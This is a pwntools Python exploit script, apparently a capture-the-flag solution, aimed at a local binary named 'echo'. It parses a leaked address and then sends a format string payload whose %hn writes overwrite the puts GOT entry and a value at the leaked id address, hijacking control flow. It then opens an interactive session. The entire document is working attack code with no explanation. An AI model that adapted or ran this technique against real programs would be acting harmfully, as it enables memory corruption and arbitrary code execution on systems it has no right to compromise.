from pwn import *
import sys

#context.log_level = 'DEBUG'

p = process('./echo', env={'LD_LIBRARY_PATH':'.'})


target = 0x080499d7
puts_got = 0x0804c06c

small = 0x0804 - 12 - 5*8
large = 0x99d7 - 0x0804


p.recvuntil("&id = 0x")
id_addr = p.recvuntil("\n", drop = True)
id_addr = int(id_addr, 16)

payload  = p32(puts_got + 2)
payload += "@@@@"
payload += p32(id_addr)
payload += "@@@@"
payload += p32(puts_got)
payload += "@@@@"
payload += p32(id_addr + 2)
payload += "%.8x" * 5 + "%." + str(0x0804 - 4 * 7 - 5 * 8) + "x%hn%." \
                             + str(0x87E2 - 0x0804) + "x%hn%." \
                             + str(0x99D7 - 0x87E2) + "x%hn%." \
                             + str(0xBD8C - 0x99D7) + "x%hn" 

p.recvuntil("charecters ...")
p.send(payload)
p.recv()
p.interactive()
